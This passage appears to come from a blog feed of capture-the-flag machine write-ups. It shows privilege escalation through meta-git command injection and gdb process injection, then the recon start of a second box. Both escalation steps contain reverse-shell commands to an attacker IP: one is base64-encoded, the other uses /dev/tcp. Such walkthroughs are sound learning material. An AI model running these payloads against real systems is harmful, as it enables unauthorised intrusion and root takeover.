</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://www.bitsgalore.org/2013/01/09/what-do-we-mean-embedded-files-pdf</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Reading </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(fileToRead), pdf<span style="color:#f92672">.</span>getPage(<span style="color:#ae81ff">0</span>)[<span style="color:#e6db74">&#39;/Annots&#39;</span>][<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>getObject()[<span style="color:#e6db74">&#39;/FS&#39;</span>][<span style="color:#e6db74">&#39;/EF&#39;</span>][<span style="color:#e6db74">&#39;/F&#39;</span>]<span style="color:#f92672">.</span>getData()<span style="color:#f92672">.</span>decode())
</span></span></code></pre></div><p><img src="reading_etcpasswd_using_script.png" alt="Reading Files Using Script"></p>
<h3 id="reading-database-credentials">Reading Database Credentials</h3>
<p>The first thing I&rsquo;ll do is to look for the main application code like index.php to see if I can find the <em>database configuration</em> file to get some <em>credentials</em>.</p>
<p><img src="reading_index.php_.png" alt="Reading index.php"></p>
<p><img src="reading_login.php_.png" alt="Reading login.php"></p>
<p><img src="reading_db_connect.php_.png" alt="Reading db_connect.php"></p>
<p>I know from the <em>/etc/passwd</em> file read before that there are 2 users on the box <em>gbyolo</em> and <em>developer</em> (They have their own <em>home directory</em> and <em>/bin/bash</em> as login shell).</p>
<p><img src="enumerating_users_from_etcpasswd.png" alt="Enumerate Users From /etc/passwd"></p>
<p>I can try to SSH to these users using the password got from reading <em>db_connect.php</em> because people usually reuse passwords everywhere.</p>
<p><img src="ssh_as_gbyolo.png" alt="SSH As gbyolo"></p>
<p>And it worked using <em>gbyolo</em> as username.</p>
<h2 id="escalating-from-user-gbyolo-to-developer">Escalating From User gbyolo To developer</h2>
<p>If I run <em>sudo -l</em> I get the following result:</p>
<p><img src="sudo_dash_l.png" alt="sudo -l As gbyolo"></p>
<p>User gbyolo can run <em>meta-git</em> as developer, howerver this executable is inside <em>/usr/local/bin</em> which means that it was installed manually (wasn&rsquo;t installed using a package manager like <em>apt</em> for example) and there is a big chance that it is out of date and could have some vulnerabilities.</p>
<p>Searching a little bit on google about meta-git and some possible exploits, I found this <a href="https://hackerone.com/reports/728040"><em>bug report</em></a> on <a href="https://hackerone.com"><em>HackerOne</em></a> which affects every version of meta-git according to <a href="https://security.snyk.io/package/npm/meta-git"><em>snyk</em></a>.</p>
<p>I can get a reverse shell now as user developer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -u developer /usr/local/bin/meta-git clone <span style="color:#e6db74">&#39;sss||echo YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjU5Lzg5ODkgMD4mMQo= | base64 -d | bash&#39;</span>
</span></span></code></pre></div><p>Howerver I need to be first in a directory writable by developer user, so I will navigate to <em>/tmp/</em>.</p>
<p><img src="gettting_reverse_shell_as_developer.png" alt="Getting Reverse Shell As developer"></p>
<p>I will get a fully interactive shell using python:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style="display:flex;"><span>$ <span style="color:#f92672">[</span>ctrl-z<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>$ stty raw -echo; fg
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#66d9ef">then</span> press enter<span style="color:#f92672">]</span>
</span></span></code></pre></div><p><img src="getting_fully_interactive_shell.png" alt="Getting Fully Interactive Shell"></p>
<h2 id="post-enumeration">Post Enumeration</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>debug<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>faculty<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bash-5.0$ find / -group debug 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/bin/gdb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bash-5.0$ ls -la /usr/bin/gdb
</span></span><span style="display:flex;"><span>-rwxr-x--- <span style="color:#ae81ff">1</span> root debug <span style="color:#ae81ff">8440200</span> Dec  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2021</span> /usr/bin/gdb
</span></span></code></pre></div><p>User developer is part of <em>debug</em> group that owns <em>/usr/bin/gdb</em> and can run it.</p>
<p>And if I check <em>linux capabilities</em> for this binary using <em>getcap</em>, I can see that it has <em>cap_sys_ptrace</em> capability, which means that the current user can attach to other processes and trace their system calls.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ getcap /usr/bin/gdb 
</span></span><span style="display:flex;"><span>/usr/bin/gdb <span style="color:#f92672">=</span> cap_sys_ptrace+ep
</span></span></code></pre></div><h2 id="getting-root">Getting root</h2>
<p>I can abuse this to attach to root running processes and call a reverse shell back to me.</p>
<p>This can be done with any process by injecting a compiled reverse shell into its memory, howerver if the process is running python3 it becomes easier, because I can call the build in python3 system function and pass a reverse shell to it directly.</p>
<p>Among the running processes I will choose this python3 process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ ps aux | grep root
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">731</span>  0.0  0.9  <span style="color:#ae81ff">26896</span> <span style="color:#ae81ff">18204</span> ?        Ss   13:15   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Then I will debug it using gdb and inject my malicious code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gdb -p <span style="color:#ae81ff">731</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i&gt;&amp; /dev/tcp/10.10.16.59/8988 0&gt;&amp;1&#39;&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p><img src="getting_root.png" alt="Getting root"></p>
]]></content>
        </item>
        
        <item>
            <title>Opensource</title>
            <link>https://mostxeon.github.io/posts/opensource/</link>
            <pubDate>Wed, 28 Sep 2022 08:35:17 +0300</pubDate>
            
            <guid>https://mostxeon.github.io/posts/opensource/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a full tcp port scan we got the below results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -sV -sC -vvv -p- -oN nmap/nmap-all-tcp.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.164
</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2022-07-27 03:06:30 EEST <span style="color:#66d9ef">for</span> 129s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE REASON      VERSION
</span></span><span style="display:flex;"><span>22/tcp   open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOm3Ocn3qQzvKFsAf8u2wdkpi0XryPX5W33bER74CfZxc4QPasF+hGBNSaCanZpccGuPffJ9YenksdoTNdf35cvhamsBUq6TD88Cyv9Qs68kWPJD71MkSDgoyMFIe7NTdzyWJJjmUcNHRvwfo6KQsVXjwC4MN+SkL6dLfAY4UawSNhJZGTiKu0snAV6TZ5ZYnmDpnKIEZzf/dOK6bBu4SCu9DRjPknuZkl7sKp3VCoI9CRIu1tihqs1NPhFa+XnHSRsULWtQqtmxZP5UXbmgwETxmpfw8M9XcMH0QXr8JSAdDkg2NtIapmPX/a3hVFATYg+idaEEQNlZHPUKLbCTyJ
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLA9ak8TUAPl/F77SPc1ut/8B+eOukyC/0lof4IrqJoPJLYusbXk+9u/OgSGp6bJZhotkJUvhC7k0rsA7WX19Y8<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxEEb33GC5nT5IJ/YY+yDpTKQGLOK1HPsEzM99H4KKA
</span></span><span style="display:flex;"><span>80/tcp   open     http    syn-ack     Werkzeug/2.1.2 Python/3.10.3
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET OPTIONS HEAD
</span></span><span style="display:flex;"><span>|_http-title: upcloud - Upload files <span style="color:#66d9ef">for</span> Free!
</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   GetRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">27</span> Jul <span style="color:#ae81ff">2022</span> 00:07:01 GMT
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">5316</span>
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;head&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;upcloud - Upload files <span style="color:#66d9ef">for</span> Free!&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/jquery/jquery-3.4.1.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/popper/popper.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/js/ie10-viewport-bug-workaround.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/css/bootstrap.css&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-grid.css&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-reboot.css&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   HTTPOptions: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">27</span> Jul <span style="color:#ae81ff">2022</span> 00:07:01 GMT
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Allow: GET, OPTIONS, HEAD
</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|   RTSPRequest: 
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;html&gt;
</span></span><span style="display:flex;"><span>|     &lt;head&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
</span></span><span style="display:flex;"><span>|     &lt;body&gt;
</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;Message: Bad request version <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;RTSP/1.0&#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
</span></span><span style="display:flex;"><span>3000/tcp filtered ppp     no-response
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port80-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>7/27%Time<span style="color:#f92672">=</span>62E081A5%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>GetR
</span></span><span style="display:flex;"><span>SF:equest,1573,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ython/3\.10\.3\r\nDate:\x20Wed,\x2027\x20Jul\x202022\x2000:07:01\x20GMT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:5316\r\nConnection:\x20close\r\n\r\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-scale=1\.0\&#34;&gt;\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n\x20\x20\x20\x20&lt;title&gt;upcloud\x20-\x20Upload\x20files\x20for\x20Free!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&lt;/title&gt;\n\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/static/vendor/jquery/jque
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ry-3\.4\.1\.min\.js\&#34;&gt;&lt;/script&gt;\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/stat
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ic/vendor/popper/popper\.min\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;script
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20src=\&#34;/static/vendor/bootstrap/js/bootstrap\.min\.js\&#34;&gt;&lt;/script&gt;\n\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20&lt;script\x20src=\&#34;/static/js/ie10-viewport-bug-workaround
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:=\&#34;/static/vendor/bootstrap/css/bootstrap\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;li
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nk\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;\x20/static/vendor/bootstrap/css/boo
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tstrap-grid\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20hr
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ef=\&#34;\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\&#34;/&gt;\n\n\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20&lt;link\x20rel=&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,C7,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Wed,\x2027\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20Jul\x202022\x2000:07:01\x20GMT\r\nContent-Type:\x20text/html;\x20cha
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:rset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nContent-Length:\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\r\nConnection:\x20close\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,1F4,<span style="color:#e6db74">&#34;&lt;!DOCTYPE\x20HTM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:L\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equ
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:iv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;E
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:rror\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20req
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:uest\x20version\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Wed Jul 27 03:08:39 2022 -- 1 IP address (1 host up) scanned in 129.97 seconds</span>
</span></span></code></pre></div><p>I can see 2 opens ports <em>(22, 80)</em> with a third <em>(3000)</em> that appears to be filtered meaning that some sort of firewall is blocking the reply back.</p>
<p>Looking at port <em>80</em>, the banner tells us that its a python/3.10.3 based <a href="https://wsgi.readthedocs.io/en/latest/what.html"><em>WSGI</em></a> web application: <a href="https://werkzeug.palletsprojects.com/en/2.1.x/"><em>Werkzeug/2.1.2</em></a></p>
<p>By surfing the home page on port 80, I can see two buttons, one to download the source code for a certain application and the other one to go to a page where you can upload a file.</p>
<p><img src="exploring-home-page.png" alt="Exploring the Home Page"></p>
<h3 id="exploring-the-source-code">Exploring the Source Code</h3>
<p>Let&rsquo;s download the source code and inspect it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>source.zip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ unzip source.zip 
</span></span><span style="display:flex;"><span>Archive:  source.zip
</span></span><span style="display:flex;"><span>   creating: app/
</span></span><span style="display:flex;"><span>   creating: app/app/
</span></span><span style="display:flex;"><span>  inflating: app/app/views.py        
</span></span><span style="display:flex;"><span>  inflating: app/app/__init__.py     
</span></span><span style="display:flex;"><span>   creating: app/app/static/
</span></span><span style="display:flex;"><span>   creating: app/app/static/js/
</span></span><span style="display:flex;"><span>   ...
</span></span></code></pre></div><h3 id="noticing-git-directory">Noticing &ldquo;.git&rdquo; Directory</h3>
<p>If I list the contents of the zip file using &ldquo;<em>ls -la</em>&rdquo; I can see a <em>.git</em> directory</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">2460</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> kali kali    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">5</span> 00:18 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> kali kali    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">4</span> 22:39 ..
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">5</span> kali kali    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">5</span> 13:38 app
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">110</span> Apr <span style="color:#ae81ff">28</span> 14:40 build-docker.sh
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> kali kali    <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">28</span> 14:34 config
</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">574</span> Apr <span style="color:#ae81ff">28</span> 15:50 Dockerfile
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">8</span> kali kali    <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">28</span> 15:50 .git
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kali kali <span style="color:#ae81ff">2489147</span> Oct  <span style="color:#ae81ff">5</span> 00:00 source.zip
</span></span></code></pre></div><p>This means that we can interact with it and see more information about this application, like different <em>branches</em>,<em>logs</em> &hellip;</p>
<p>After searching around a little bit, I got something interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git branches <span style="color:#75715e"># to list available branches</span>
</span></span><span style="display:flex;"><span>  dev
</span></span><span style="display:flex;"><span>* public
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ git switch dev <span style="color:#75715e"># to switch to the &#34;dev&#34; branch</span>
</span></span><span style="display:flex;"><span>Switched to branch <span style="color:#e6db74">&#39;dev&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git log <span style="color:#75715e"># to list the logs (every change and commit made to the project)</span>
</span></span><span style="display:flex;"><span>commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 <span style="color:#f92672">(</span>HEAD -&gt; dev<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:47:24 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ease testing
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:54 <span style="color:#ae81ff">2022</span> +0200
